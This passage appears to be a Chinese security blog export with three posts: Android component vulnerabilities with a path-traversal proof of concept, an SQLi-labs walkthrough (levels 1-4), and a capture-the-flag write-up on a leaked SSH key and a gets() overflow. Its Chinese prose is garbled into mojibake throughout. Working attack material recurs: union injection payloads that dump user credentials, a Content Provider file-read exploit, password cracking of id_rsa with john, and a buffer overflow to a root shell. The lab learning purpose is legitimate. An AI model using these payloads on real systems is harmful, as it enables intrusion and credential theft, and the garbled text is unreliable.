è‡ªç”±çš„å‘é€å’Œæ¥æ”¶å¹¿æ’­ã€‚ 2.1.4 contentprovider&emsp;&emsp;contentProvideræ˜¯ç”¨æ¥ä¿å­˜æˆ–è€…è·å–æ•°æ®ï¼Œå¹¶ä½¿å…¶å¯¹æ‰€æœ‰åº”ç”¨ç¨‹åºå¯è§ã€‚ ä¸‰ã€è¶Šæƒç»•è¿‡&emsp;&emsp;å¯¹äº activity ç»„ä»¶ï¼Œä¸»è¦ä¼šå­˜åœ¨è¶Šæƒç»•è¿‡ï¼Œæ¯”å¦‚ç»•è¿‡æ‰‹åŠ¿å¯†ç ï¼Œè·³è¿‡éªŒè¯é˜¶æ®µã€‚æ­¤å¤„å¯ä»¥åˆ©ç”¨ç›´æ¥å¯åŠ¨æ‰‹åŠ¿å¯†ç ä¹‹åçš„æ´»åŠ¨æ¥è¿›è¡ŒéªŒè¯ am start -n åŒ…å/.æ´»åŠ¨å &emsp;&emsp;è‹¥æ˜¯å¯ä»¥ç›´æ¥å¯åŠ¨ï¼Œåˆ™è¯æ˜å­˜åœ¨è¶Šæƒæ¼æ´ã€‚ å››ã€æ‹’ç»æœåŠ¡æ”»å‡»&emsp;&emsp;è¿˜æœ‰æ‹’ç»æœåŠ¡æ”»å‡»ï¼ŒAndroid æä¾› Intent æœºåˆ¶æ¥ååŠ©åº”ç”¨é—´çš„äº¤äº’ä¸é€šè®¯ï¼ŒIntent è´Ÿè´£å¯¹ä¸€æ¬¡æ“ä½œçš„åŠ¨ä½œã€åŠ¨ä½œæ¶‰åŠçš„æ•°æ®è¿›è¡Œæè¿°ï¼Œç³»ç»Ÿåˆ™æ ¹æ®æ­¤ Intent æè¿°ï¼Œæ¥è°ƒç”¨å¯¹åº”çš„ Activityã€ servicer å’Œ BroadCast ç­‰ç»„ä»¶ï¼Œæ¥å®Œæˆç»„ä»¶çš„è°ƒç”¨ã€‚ &emsp;&emsp;å¦‚æœç¨‹åºæ²¡æœ‰å¯¹ **Intent.getXXXExtra() è·å–çš„å¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®å¤„ç†æ—¶æ²¡æœ‰è¿›è¡Œå¼‚å¸¸æ•è·ï¼Œå°±ä¼šå¯¼è‡´æ”»å‡»è€…å¯é€šè¿‡å‘å—å®³è€…åº”ç”¨å‘é€æ­¤ç±»ç©ºæ•°æ®ã€å¼‚å¸¸æˆ–è€…ç•¸å½¢æ•°æ®æ¥ä½¿è¯¥åº”ç”¨å´©æºƒï¼Œç®€å•çš„è¯´å°±æ˜¯é€šè¿‡ intent å‘é€ç©ºæ•°æ®ã€å¼‚å¸¸æˆ–ç•¸å½¢æ•°æ®ç»™åº”ç”¨ï¼Œæ¥å®ç°è®©åº”ç”¨å´©æºƒçš„ç›®çš„ã€‚ &emsp;&emsp;å¯¹åº”çš„ä¸åŒæŠ¥é”™ä¿¡æ¯ Java.lang.NullPointerExceptionï¼ŒåŸå› æ˜¯ç¨‹åºæ²¡æœ‰å¯¹getAction()ç­‰è·å–åˆ°çš„æ•°æ®è¿›è¡Œç©ºæŒ‡é’ˆåˆ¤æ–­ã€‚intent.putExtra(&quot;&quot;, &quot;&quot;);å¯¼è‡´ç©ºæŒ‡é’ˆå¼‚å¸¸å¯¼è‡´åº”ç”¨å´©æºƒJava.lang.ClassCastException åŸå› æ˜¯ç¨‹åºæ²¡æœ‰getSerializableExtra()ç­‰è·å–åˆ°çš„æ•°æ®è¿›è¡Œç±»å‹åˆ¤æ–­è€Œè¿›è¡Œå¼ºåˆ¶ç±»å‹è½¬æ¢Java.lang.IndexOutOfBoundsExceptionï¼ŒåŸå› æ˜¯ç¨‹åºæ²¡æœ‰å¯¹getIntegerArrayListExtra()ç­‰è·å–åˆ°çš„æ•°æ®æ•°ç»„å…ƒç´ å¤§å°çš„åˆ¤æ–­Java.lang.ClassNotFoundExceptionï¼ŒåŸå› æ˜¯ç¨‹åºæ²¡æœ‰æ— æ³•æ‰¾åˆ°ä»getSerializableExtra()è·å–åˆ°çš„åºåˆ—åŒ–ç±»å¯¹è±¡çš„ç±»å®šä¹‰ äº”ã€ServiceæœåŠ¡æš´éœ²&emsp;&emsp;ä»¥ä¹‹å‰ç‰ˆæœ¬çš„æŸ app ä¸ºä¾‹ï¼Œå…¶ä¸­çš„å‡çº§æœåŠ¡ï¼Œä¼ å…¥ PushMsg çš„ Serializable çš„æ•°æ®ã€‚ &emsp;&emsp;æ­¤æ—¶æ¶æ„ä¼ªé€ å¹¶å¯åŠ¨æš´éœ²çš„service å…­ã€Broadcastæš´éœ²&emsp;&emsp;æ¯”å¦‚ç›®æ ‡ç¨‹åºå¦‚ä¸‹ Intent v1 = new Intent(); v1.setAction(&quot;com.simple.action.server_running&quot;); v1.putExtra(&quot;local_ip&quot;,v0.h); v1.putExtra(&quot;port&quot;,v0.i); v1.putExtra(&quot;code&quot;,v0.g); v1.putExtra(&quot;connected&quot;,v0.s); v1.putExtra(&quot;pwd_predefined&quot;,v0.r); if(!TextUtils.isEmpty(v0.t))&#123; v1.putExtra(&quot;connected_usr&quot;,v0.t); &#125; sendBroadcast(v1);&#125; &emsp;&emsp;è¯¥ç¨‹åºé€šè¿‡ intent éšå¼ä¼ é€’ï¼Œå¹¶é€šè¿‡ action åŒ¹é…å‘é€ä¸€ä¸ªå¹¿æ’­ï¼Œè¿™æ ·ç³»ç»Ÿå†…å…¶ä»–ç¨‹åºéƒ½å¯ä»¥æ¥æ”¶åˆ°è¿™ä¸ªå¹¿æ’­ï¼Œç„¶ååœ¨å¹¿æ’­æ¥æ”¶è€…ä¸­ç¼–å†™æ¥æ”¶ä»£ç ï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡æ”»å‡»ä»£ç è·å–æ•æ„Ÿæ•°æ®ä¿¡æ¯ public void onReceive(Context context,Intent intent)&#123; String s = null; if(intent.getAction().equals(&quot;com.sample.action.server_running&quot;))&#123; String pwd=intent.getStringExtra(&quot;connected&quot;); s=&quot;Airdroid =&gt; [&quot;+pwd+&quot;]/&quot;+intent.getExtras(); &#125; Toast.makeTest(context,String.format(&quot;%sReceived&quot;,s),Toast.LENGTH_SHORT).show();&#125; ä¸ƒã€Content Providerç›®å½•éå†æ¼æ´&emsp;&emsp;Android Content Provider å­˜åœ¨æ–‡ä»¶ç›®å½•éå†å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºå¯¹å¤–æš´éœ² Content Providerç»„ä»¶çš„åº”ç”¨ï¼Œæ²¡æœ‰å¯¹ Content Provider ç»„ä»¶çš„è®¿é—®è¿›è¡Œæƒé™æ§åˆ¶å’Œå¯¹è®¿é—®çš„ç›®æ ‡æ–‡ä»¶çš„Content Query Uriè¿›è¡Œæœ‰æ•ˆåˆ¤æ–­ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥åº”ç”¨æš´éœ²çš„ Content Providerçš„openFile()æ¥å£è¿›è¡Œæ–‡ä»¶ç›®å½•éå†ä»¥è¾¾åˆ°è®¿é—®ä»»æ„å¯è¯»æ–‡ä»¶çš„ç›®çš„ã€‚ &emsp;&emsp;æ­¤æ—¶çš„æ¡ä»¶æ˜¯å¯¹å¤–æš´éœ²çš„Content Providerç»„ä»¶å®ç°äº†openFile()æ¥å£ &emsp;&emsp;æ²¡æœ‰å¯¹æ‰€è®¿é—®çš„ç›®æ ‡æ–‡ä»¶ Uri è¿›è¡Œæœ‰æ•ˆåˆ¤æ–­ï¼Œå¦‚æ²¡æœ‰è¿‡æ»¤é™åˆ¶å¦‚ ../ å¯å®ç°ä»»æ„å¯è¯»æ–‡ä»¶çš„è®¿é—®çš„ Content Query Uri ã€‚ &emsp;&emsp;æ¯”å¦‚ï¼ŒæŸ APP çš„å®ç°ä¸­å®šä¹‰äº†ä¸€ä¸ªå¯ä»¥è®¿é—®æœ¬åœ°æ–‡ä»¶çš„ Content Provider ç»„ä»¶ï¼Œé»˜è®¤çš„ android:exported=&quot;true&quot;ï¼Œå¯¹åº”com.xxxx.android.jobs.html5.LocalFileContentProviderï¼Œè¯¥ Provider å®ç°äº† openFile() æ¥å£ï¼Œé€šè¿‡æ­¤æ¥å£å¯ä»¥è®¿é—®å†…éƒ¨å­˜å‚¨ app_webview ç›®å½•ä¸‹çš„æ•°æ®ï¼Œç”±äºåå°æœªèƒ½å¯¹ç›®æ ‡æ–‡ä»¶åœ°å€è¿›è¡Œæœ‰æ•ˆåˆ¤æ–­ï¼Œå¯ä»¥é€šè¿‡â€../â€œå®ç°ç›®å½•è·¨è¶Šï¼Œå®ç°å¯¹ä»»æ„ç§æœ‰æ•°æ®çš„è®¿é—®ã€‚ &emsp;&emsp;æ”»å‡»poc public void GJContentProviderFileOperations()&#123; try&#123; InputStream in = getContentResolver().openInputStream(Uri.parse(&quot;content://com.xxx.html5.localfile.1/webview/../../shared_prefs/userinfo.xml&quot;)); ByteArrayOutputStream out = new ByteArrayOutputStream(); byte[] buffer = new byte[1024]; int n = in.read(buffer); while(n&gt;0)&#123; out.write(buffer, 0, n); n = in.read(buffer); Toast.makeText(getBaseContext(), out.toString(), Toast.LENGTH_LONG).show(); &#125; &#125;catch(Exception e)&#123; debugInfo(e.getMessage()); &#125;&#125;","categories":[{"name":"ç§»åŠ¨å®‰å…¨","slug":"ç§»åŠ¨å®‰å…¨","permalink":"https://wolke.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç§»åŠ¨å®‰å…¨","slug":"ç§»åŠ¨å®‰å…¨","permalink":"https://wolke.cn/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"},{"name":"Android","slug":"Android","permalink":"https://wolke.cn/tags/Android/"}],"author":"w01ke"},{"title":"sqlilabs 1-4","slug":"sqlilabs-1-4","date":"2021-12-06T11:23:13.000Z","updated":"2022-01-03T03:29:46.391Z","comments":true,"path":"post/f9788371.html","link":"","permalink":"https://wolke.cn/post/f9788371.html","excerpt":"","text":"ç¬¬ä¸€å…³ï¼šGET-æŠ¥é”™æ³¨å…¥-å•å¼•å·-å­—ç¬¦å‹æ³¨å…¥1.1 åˆ¤æ–­é—­åˆæ–¹å¼ id=1\\å¯ä»¥çŸ¥é“ä¸ºå•å¼•å·é—­åˆ id=1&#39;--+éªŒè¯æˆåŠŸ 1.2 æŸ¥çœ‹æœ‰å¤šå°‘åˆ— id=1&#39; order by 3--+ç”¨äºŒåˆ†æ³•çŸ¥é“æœ‰3åˆ— 1.3 ä½¿ç”¨è”åˆæŠ¥é”™æ³¨å…¥ id=-1&#39; union select 1,2,3--+ä½¿å‰é¢æŠ¥é”™ï¼Œä½¿ç”¨unionæŠ¥é”™æ³¨å…¥ï¼Œè®©åé¢çš„ç»“æœæ˜¾ç¤ºå‡ºæ¥ï¼Œå‘ç°2å’Œ3çš„ä½ç½®å¯ä»¥æ˜¾ç¤ºå‡ºæ•°æ®æ¥ id=-1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),database()--+ çŸ¥é“å½“å‰æ•°æ®åº“securityæœ‰emailsã€referersã€uagentsã€usersè¡¨ id=-1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;),database()--+å¯ä»¥çŸ¥é“usersè¡¨æœ‰idã€usernameã€passwordå­—æ®µ ç¬¬äºŒå…³ï¼šGET-æŠ¥é”™æ³¨å…¥-æ•°å­—å‹æ³¨å…¥2.1 åˆ¤æ–­é—­åˆæ–¹å¼ id=1\\å‘ç°è²Œä¼¼æ˜¯æ•°å­—å‹æ³¨å…¥ id=1 and 1=1æ­£å¸¸ id=1 and 1=2å¤±è´¥ï¼Œå¯ä»¥çŸ¥é“æ˜¯æ•°å­—å‹æ³¨å…¥ 2.2 æŸ¥çœ‹æœ‰å¤šå°‘åˆ— id=1 order by 3 ç”¨äºŒåˆ†æ³•å¯ä»¥çŸ¥é“åªæœ‰ä¸‰åˆ— 2.3 ä½¿ç”¨è”åˆæŠ¥é”™æ³¨å…¥ id=1 and 1=2 union select 1,2,3è®©å‰é¢æŠ¥é”™ï¼Œè®©åé¢çš„ç»“æœæ˜¾ç¤ºï¼Œå¯ä»¥å‘ç°2å’Œ3çš„ä½ç½®ä¼šæ˜¾ç¤ºå‡ºæ¥ id=1 and 1=2 union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())å¯ä»¥çŸ¥é“å½“å‰æ•°æ®åº“ä¸ºsecurityï¼Œç”±emailsã€referersã€uagentsã€usersè¡¨ id=1 and 1=2 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)å¯ä»¥çŸ¥é“usersè¡¨æœ‰idã€usernameã€passwordå­—æ®µ id=1 and 1=2 union select 1,2,(select group_concat(username,0x3a,password) from users)å¯ä»¥çŸ¥é“ç”¨æˆ·åå’Œå¯†ç  id=-1&#39; union select 1,2,(select group_concat(username,0x3a,password) from users)--+æˆåŠŸçˆ†å‡ºç”¨æˆ·åå’Œå¯†ç  ç¬¬ä¸‰å…³ï¼šGET-æŠ¥é”™æ³¨å…¥-å•å¼•å·å’Œæ‹¬å·-å­—ç¬¦å‹æ³¨å…¥3.1 åˆ¤æ–­é—­åˆæ–¹å¼ ä½¿ç”¨\\çˆ†å‡ºäº†é”™è¯¯ï¼Œå¯ä»¥çŸ¥é“æ˜¯ç”¨(â€˜xxxâ€™)å¼•èµ·æ¥çš„ id=1&#39;)--+ éªŒè¯æˆåŠŸ 3.2 æŸ¥çœ‹æœ‰å¤šå°‘åˆ— id=1&#39;) order by 3 --+ç»è¿‡äºŒåˆ†æ³•ç­‰å¯ä»¥çŸ¥é“æœ‰ä¸‰åˆ— 3.3 ä½¿ç”¨è”åˆæŠ¥é”™æ³¨å…¥ id=-1&#39;) union select 1,2,3--+ä½¿ç”¨unionè”åˆæ³¨å…¥ï¼Œä½¿å‰é¢æŠ¥é”™ï¼Œè®©åé¢çš„æ˜¾ç¤ºå‡ºæ¥ï¼Œå‘ç°2å’Œ3çš„ä½ç½®ä¼šçˆ†å‡ºé”™è¯¯ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥å°±åˆ©ç”¨è¿™ä¸¤ä¸ªä½ç½®è¿›è¡Œæ“ä½œ id=-1&#39;) union select 1,database(),(select table_name from information_schema.tables where table_schema=database() limit 0,1)--+ æˆ–è€…ç›´æ¥ä½¿ç”¨id=-1&#39;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+ å¯ä»¥çŸ¥é“æ•°æ®åº“åä¸ºsecurityï¼Œæœ‰emailsã€referersã€uagentsã€usersè¡¨ id=-1&#39;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+å¯ä»¥çŸ¥é“usersè¡¨æœ‰idã€usernameã€passwordå­—æ®µ id=-1&#39;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+å¯ä»¥æŸ¥çœ‹åˆ°ç”¨æˆ·åå’Œå¯†ç  ç¬¬å››å…³ï¼šGET-æŠ¥é”™æ³¨å…¥-åŒå¼•å·å’Œæ‹¬å·-å­—ç¬¦å‹æ³¨å…¥4.1 åˆ¤æ–­é—­åˆæ–¹å¼ id=1\\å¯ä»¥çŸ¥é“æ˜¯(â€œâ€)é—­åˆ id=1&quot;) --+éªŒè¯æˆåŠŸ 4.2 æŸ¥çœ‹æœ‰å¤šå°‘åˆ— id=1&quot;) order by 3--+ç”±äºŒåˆ†æ³•å¯ä»¥çŸ¥é“åªæœ‰3åˆ— 4.3 ä½¿ç”¨è”åˆæŠ¥é”™æ³¨å…¥ id=-1&quot;) union select 1,2,3--+ä½¿ç”¨unionè”åˆæ³¨å…¥ï¼Œä½¿å‰é¢æŠ¥é”™ï¼Œè®©åé¢çš„æ˜¾ç¤ºå‡ºæ¥ï¼Œå‘ç°2å’Œ3çš„ä½ç½®ä¼šçˆ†å‡ºé”™è¯¯ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥å°±åˆ©ç”¨è¿™ä¸¤ä¸ªä½ç½®è¿›è¡Œæ“ä½œ id=-1&quot;) union select 1,database(),(select group_concat(table_name) from information_schema.tables where table_schema=database())--+å¯ä»¥çŸ¥é“æ•°æ®åº“åä¸ºsecurityï¼Œæœ‰emailsã€referersã€uagentsã€usersè¡¨ id=-1&quot;) union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39;)--+å¯ä»¥çŸ¥é“usersè¡¨æœ‰idã€usernameã€passwordå­—æ®µ id=-1&quot;) union select 1,(select group_concat(username) from users),(select group_concat(password) from users)--+å¯ä»¥æŸ¥çœ‹åˆ°ç”¨æˆ·åå’Œå¯†ç ","categories":[{"name":"æ–¹å‘é¶åœº","slug":"æ–¹å‘é¶åœº","permalink":"https://wolke.cn/categories/%E6%96%B9%E5%90%91%E9%9D%B6%E5%9C%BA/"}],"tags":[{"name":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","permalink":"https://wolke.cn/tags/SQL%E6%B3%A8%E5%85%A5/"},{"name":"sqlilabs","slug":"sqlilabs","permalink":"https://wolke.cn/tags/sqlilabs/"}],"author":"w01ke"},{"title":"SSHç§é’¥æ³„éœ²","slug":"SSHç§é’¥æ³„éœ²","date":"2021-12-06T11:18:07.000Z","updated":"2022-01-03T03:29:57.638Z","comments":true,"path":"post/e8314d47.html","link":"","permalink":"https://wolke.cn/post/e8314d47.html","excerpt":"","text":"ä¸€ã€é¶æœºè¯´æ˜1ã€ä¸‹è½½é“¾æ¥&emsp;&emsp;é¶åœºé•œåƒï¼šé“¾æ¥: https://pan.baidu.com/s/1xfKILyIzELi_ZgUw4aXT7w æå–ç : 59g0 2ã€é¶æœºå‡†å¤‡ï¼ˆ1ï¼‰é‡ç½®é¶åœºå¯†ç &emsp;&emsp;é‡å¯ä¸»æœºï¼Œé•¿æŒ‰shiftï¼Œè¿›å…¥å¦‚ä¸‹ç•Œé¢åï¼ŒæŒ‰e &emsp;&emsp;æ‰¾åˆ°linuxå¼€å¤´çš„è¡Œï¼Œåœ¨æœ€åè¾“å…¥ init=/bin/bashï¼Œè¾“å…¥å®ŒæˆåæŒ‰Crtl+X &emsp;&emsp;mount -o rw,remount /ï¼Œå›è½¦ &emsp;&emsp;passwd rootï¼Œé‡ç½®å¯†ç  &emsp;&emsp;å¦‚æœæç¤ºæ”¹å˜å¯†ç æˆåŠŸï¼Œé‡å¯è¯¥è™šæ‹Ÿæœº ï¼ˆ2ï¼‰æŸ¥çœ‹IP&emsp;&emsp;ä½¿ç”¨åˆšæ‰ä¿®æ”¹çš„å¯†ç è¿›å…¥é¶åœºä¸»æœºï¼Œè¾“å…¥ip aï¼ŒæŸ¥çœ‹IPåœ°å€ äºŒã€ä¿¡æ¯æ”¶é›†1ã€å‘ç°é¶æœºIP&emsp;&emsp;å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä¸¤ç§æ–¹æ³•ï¼šarp-scanå’Œnetdiscover ï¼ˆ1ï¼‰arp-scan&emsp;&emsp;ä½¿ç”¨arp-scanæ¢ç´¢é¶æœºIPï¼Œå‘ç°IPåœ°å€ä¸º192.168.43.165 arp-scan -l ï¼ˆ2ï¼‰netdiscover&emsp;&emsp;ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹Kaliæœ¬æœºIPä¸º192.168.43.167 ip a &emsp;&emsp;ä½¿ç”¨netdiscoverå‘½ä»¤ netdiscover -r ip/å­ç½‘æ©ç  å‘½ä»¤æ¥æ¢æµ‹é¶æœº netdiscover -r 192.168.43.1/24 2ã€å¼€æ”¾ç«¯å£ä¸æœåŠ¡æ‰«æ&emsp;&emsp;ä½¿ç”¨nmapæ‰«æ nmap -sV 192.168.43.165 &emsp;&emsp;å‘ç° 22â€“sshã€80â€“nginxã€31337â€“pythonï¼Œè¿™ä¸ª31337ç«¯å£å¯ä»¥çœ‹å‡ºæ¥æ˜¯pythonåšçš„ä¸€ä¸ªç½‘ç«™ã€‚æ­¤é¶åœºæœºå™¨ä¸Šå¼€å¯äº†sshæœåŠ¡å’Œä¸¤ä¸ªhttpæœåŠ¡ &emsp;&emsp;æ¥ä¸‹æ¥æˆ‘ä»¬åˆ†æç‰¹æ®Šç«¯å£ï¼Œå°¤å…¶å¯¹å¼€æ”¾httpæœåŠ¡çš„å¤§ç«¯å£ï¼ˆæœ¬é¶æœºä¸Š31337ç«¯å£å¼€æ”¾äº†httpæœåŠ¡ï¼‰ &emsp;&emsp;è®¿é—®31337ç«¯å£å¯¹åº”ç½‘ç«™ï¼Œæ²¡æœ‰æ–‡ä»¶ï¼Œé‚£å°±å¯¹è¯¥ç½‘ç«™è¿›è¡Œç›®å½•æ‰«æ 3ã€ç›®å½•æ‰«æ&emsp;&emsp;ä½¿ç”¨dirsearchè¿›è¡Œç›®å½•æ‰«æï¼š dirsearch -u http://192.168.43.165:31337 &emsp;&emsp;å‘ç°æœ‰ robots.txtã€**/.ssh/id_rsa** å’Œ /.ssh/authorized_keys ç­‰ &emsp;&emsp;æˆ–è€…ä½¿ç”¨dirbæ¢æµ‹ dirb http://192.168.43.165:31337 &emsp;&emsp;è®¿é—®robots.txtï¼Œå‘ç°ä»¥ä¸‹æ–‡ä»¶è·¯å¾„ï¼Œé€ä¸ªè®¿é—® &emsp;&emsp;å½“è®¿é—® http://10.3.35.8:31337/taxes/ çš„æ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°ç¬¬1ä¸ªflag &emsp;&emsp;åœ¨å‰é¢æˆ‘ä¹ˆä»¬è¿˜çœ‹åˆ°æœ‰ /.ssh/id_rsa å’Œ /.ssh/authorized_keysï¼Œä½¿ç”¨ç½‘ç«™è®¿é—®ï¼Œå°†å®ƒä»¬ä¸‹è½½ä¸‹æ¥ï¼Œ å°†ä¸‹è½½ä¸‹æ¥çš„æ–‡ä»¶æŸ¥çœ‹ä¸€ä¸‹ id_rsaæ˜¯ç§é’¥ï¼Œauthorized_keys æ˜¯è®¤è¯å…³é”®å­— id_rsaæ–‡ä»¶ï¼ˆå…¬é’¥ï¼‰éœ€è¦å¯†ç æ‰èƒ½æ‰“å¼€ &emsp;&emsp;åœ¨authorized_keysæ–‡ä»¶ï¼ˆè¿™é‡Œå°±æ˜¯æ³„éœ²çš„ç§é’¥ï¼‰ä¸­ç–‘ä¼¼çœ‹åˆ°äº†ä¸€ä¸ªè´¦æˆ·åç§° simon ä¸‰ã€æ¼æ´æ¢æµ‹ä¸åˆ©ç”¨1ã€å°è¯•å»ºç«‹sshè¿æ¥&emsp;&emsp;å°è¯•å»ºç«‹sshè¿æ¥ ssh -i id_rsa simon@192.168.43.165 &emsp;&emsp;å‘ç°è¦è¾“å…¥å¯†é’¥ id_rsa çš„å¯†ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ç”¨é€šè¿‡ç ´è§£ç§é’¥å¾—åˆ°å¯†ç  2ã€ç ´è§£ç§é’¥è·å–å¯†ç &emsp;&emsp;å› ä¸ºç­‰ä¼šè¦ä½¿ç”¨åˆ°ssh2johnï¼Œé¦–å…ˆæŸ¥çœ‹ssh2johnçš„è·¯å¾„ locate ssh2john &emsp;&emsp;ä½¿ç”¨ssh2john.pyå°†å¯†é’¥ä¿¡æ¯è½¬æ¢ä¸ºjohnå¯è¯†åˆ«ä¿¡æ¯ï¼šï¼ˆé€šè¿‡è¿™ä¸ªpythonæ–‡ä»¶è®°å¿†å®ƒçš„ç”¨å¤„å¯èƒ½æ›´å¥½ï¼šssh to johnï¼‰ python /usr/share/john/ssh2john.py id_rsa &gt; rsacrack &emsp;&emsp;åˆ©ç”¨å­—å…¸ç ´è§£è§£å¯†rsacrackä¿¡æ¯ï¼Œå‘ç°å¯†ç  starwars zcat /usr/share/wordlists/rockyou.txt.gz | john --pipe --rule rsacrackæˆ–è€…john rsacrack 3ã€å»ºç«‹sshè¿æ¥&emsp;&emsp;ä½¿ç”¨simonå»ç™»å½•æœåŠ¡å™¨ssh -i id_rsa simon@192.168.43.165ï¼Œå¯†ç ä¸ºï¼šstarwarsï¼Œå¦‚æœå‡ºç°ä»¥ä¸‹æŠ¥é”™è¯´æ˜æ˜¯æ–‡ä»¶æƒé™çš„é—®é¢˜ï¼Œä¿®æ”¹æƒé™ä¸º600é‡æ–°è¿æ¥å³å¯ 4ã€æº¢å‡ºææƒ&emsp;&emsp;ç™»å½•æˆåŠŸï¼Œç›´æ¥æ¥ä¸€å¥—ç®€å•çš„whoamiå’Œpwdç­‰æŸ¥çœ‹ä¸»æœºç›¸å…³ä¿¡æ¯ï¼Œå‘ç°rootç›®å½•ä¸‹æœ‰ä¸ªflag.txtï¼Œä½†æ— æƒæŸ¥çœ‹ &emsp;&emsp;ç™»å½•æˆåŠŸï¼Œ ä»æ ¹ç›®å½•â€œ/â€å¼€å§‹æŸ¥æ‰¾æ•´ä¸ªç³»ç»Ÿæ‰€æœ‰æ–‡ä»¶ä¸­æ‹¥æœ‰suidç‰¹æ®Šæƒé™çš„æ–‡ä»¶ï¼Œå¹¶å¿½ç•¥é”™è¯¯ä»¥é˜²æ‰“æ–­æŸ¥æ‰¾ï¼ŒæŸ¥çœ‹æ•´å°æœåŠ¡å™¨å…·æœ‰rootæƒé™çš„æ–‡ä»¶ find / -perm -4000 2&gt;/dev/null &emsp;&emsp;å¥½å¤šä¸œè¥¿ï¼Œä¸”/usr/local/bin/read_messageå¯æ‰§è¡Œæ–‡ä»¶æœ‰rootæƒé™ï¼Œåˆšåˆšçœ‹åˆ°å½“å‰ç›®å½•æ˜¯æœ‰è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶çš„æºä»£ç çš„ï¼Œé‚£å…ˆçœ‹ä¸‹read_message.cè¿™ä¸ªæ–‡ä»¶ï¼Œå‘ç°äº†flag2ï¼ŒåŒæ—¶è¿›è¡Œä»£ç å®¡è®¡ &emsp;&emsp;linuxç³»ç»Ÿä¸­ï¼Œæ˜¯å¯ä»¥é ç¼–è¯‘cä»£ç æ¥æˆä¸ºç³»ç»Ÿä¸€éƒ¨åˆ†å‘½ä»¤çš„ï¼ï¼ï¼ï¼æŸ¥çœ‹read_messageä»£ç åï¼Œå‘ç°å›ºå®šå¤§å°çš„æ•°ç»„ï¼Œæƒ³èƒ½å¦åˆ¶é€ å†…å­˜æº¢å‡ºã€‚ç»è¿‡å®éªŒæˆ‘ä»¬æƒŠå¥‡çš„å‘ç°è¾“å…¥Simonä¸SimonAAAç«Ÿç„¶æœ‰åŒæ ·çš„è¾“å‡ºï¼è¿™è¯´æ˜read_messageä»£ç åªå…³æ³¨å‰äº”ä¸ªå­—ç¬¦è€Œä¸å…³æ³¨bufæ•°ç»„ä¸­å…¶ä»–å­—ç¬¦ã€‚ #include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;// You&#x27;re getting close! Here&#x27;s another flag:// flag2&#123;use_the_source_luke&#125;int main(int argc, char *argv[]) &#123; char program[] = &quot;/usr/local/sbin/message&quot;; char buf[20]; char authorized[] = &quot;Simon&quot;; printf(&quot;What is your name?\\n&quot;); gets(buf); // Only compare first five chars to save precious cycles: if (!strncmp(authorized, buf, 5)) &#123; printf(&quot;Hello %s! Here is your message:\\n\\n&quot;, buf); // This is safe as the user can&#x27;t mess with the binary location: execve(program, NULL, NULL); &#125; else &#123; printf(&quot;Sorry %s, you&#x27;re not %s! The Internet Police have been informed of this violation.\\n&quot;, buf, authorized); exit(EXIT_FAILURE); &#125;&#125; &emsp;&emsp;å³éªŒè¯æ•°ç»„å‰5ä¸ªå­—ç¬¦ï¼Œé™å®šå­—ç¬¦æ•°ä¸ºæœ€å¤š20ä¸ª ï¼Œå‰5ä¸ªä¸ºSimonå³å¯ã€‚æˆ‘ä»¬è¯•ç€è¾“20å¤šä¸ªå­—ç¬¦ä½¿å…¶æº¢å‡ºï¼Œè¾“å…¥è¶…è¿‡ä»–ç¼“å­˜å­—ç¬¦é•¿åº¦çš„å­—ç¬¦è¶…å‡ºçš„éƒ¨åˆ†ä¸ºrootæƒé™çš„ç›®å½•è·¯å¾„ &emsp;&emsp;è¿›å…¥ç›®å½•ï¼šcd /usr/local/binï¼Œæ‰§è¡Œå¯æ‰§è¡Œæ–‡ä»¶read_messageï¼Œè¾“å…¥SimonAAAAAAAAAAAAAAA/bin/shï¼ŒææƒæˆåŠŸã€‚æŸ¥çœ‹æœ€åä¸€ä¸ªflag ä¸‰ã€æƒ…æ™¯&emsp;&emsp;æœ‰äº›ä¼ä¸šï¼Œä»–ä»¬çš„å‘˜å·¥åœ¨æ¯”å¦‚åœ¨/home/ç›®å½•ä¸‹ï¼Œä¸ºäº†æ–¹ä¾¿å¤§å®¶æŠ¥è¡¨æˆ–è€…å…±äº«äº›å…¶ä»–æ–‡ä»¶èµ„æ–™ç­‰ï¼Œå°±ä¼šå¼€å¯ä¸€ä¸ªhttp serveræ¥ä½œä¸ºå¤§å®¶å…±äº«çš„ä¸€ä¸ªå¹³å°ï¼Œä½†æ˜¯åœ¨æ¯ä¸ªå‘˜å·¥çš„æ¯”å¦‚/home/xiaomingç›®å½•ä¸‹ï¼Œè¿˜æœ‰/home/xiaoming/.ssh/id_rsaå’Œ/home/xiaoming/.ssh/authorized_keyså­˜åœ¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç›´æ¥è®¿é—®è¯¥ç›®å½•ä¸‹è½½è¿™äº›æ–‡ä»¶å¾—åˆ°sshçš„ç§é’¥ï¼Œé€ æˆSSHå¯†é’¥æ³„éœ²ï¼Œä»¥åˆæ³•ç”¨æˆ·çš„åä¹‰ç™»å½•åˆ°ç›®æ 